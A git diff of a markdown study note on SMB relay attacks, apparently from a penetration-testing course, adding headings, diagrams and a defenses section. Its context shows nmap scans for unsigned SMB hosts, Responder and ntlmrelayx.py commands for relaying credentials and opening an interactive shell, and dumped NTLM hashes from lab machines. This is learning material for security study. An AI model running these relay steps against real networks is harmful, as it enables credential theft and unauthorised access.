@@ -1,6 +1,14 @@
 # SMB Relay Attacks
 
+## What is SMB Relay
+
+![image](https://user-images.githubusercontent.com/96747355/167957290-5eee0e72-c551-41a6-b4e8-1576692615b9.png)  
+*Source: TCM Security Academy*  
+![image](https://user-images.githubusercontent.com/96747355/167957396-3dba4765-9007-4fe3-989c-cefc2422e5e4.png)  
+*Source: TCM Security Academy*  
+
 ## Discovering hosts
+
 - Possible with [Nessus](https://www.tenable.com/products/nessus)
 - With [Nmap](https://nmap.org/)
 ```nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24```
@@ -53,7 +61,9 @@ Nmap done: 256 IP addresses (5 hosts up) scanned in 28.67 seconds
 ```
 The domain controller has `enable` and `required`, we wont relay on this machine.
 
-## Attack 1st way
+## SMB Relay Attack
+
+### Attack 1st way
 
 - In responder config (Responder.conf) we put http and smb on off
 - Responder command
@@ -69,7 +79,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:25e61d7e5702c678e3be8711
 Jessica Jones:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
 ```
 
-## Attack 2nd way
+### Attack 2nd way
 
 - We launch Responder (with http and smb off), we launch ntlmrelayx.py just like befor but with -i to try to get an interactive shell.
 ```ntlmrelayx.py -tf targets.txt -smb2support -i```
@@ -138,3 +148,8 @@ drw-rw-rw-          0  Fri Jan 28 17:23:30 2022 Windows
 #
 ```
 *Note: ntlmrelayx.py is really powerfull and has many commands, we could even launch other shells.*
+
+## SMB Relay attack Defenses
+
+![image](https://user-images.githubusercontent.com/96747355/167957563-c1a2d775-3c4a-4aec-94ac-08dc5d0c505d.png)  
+*Source: TCM Security Academy*  
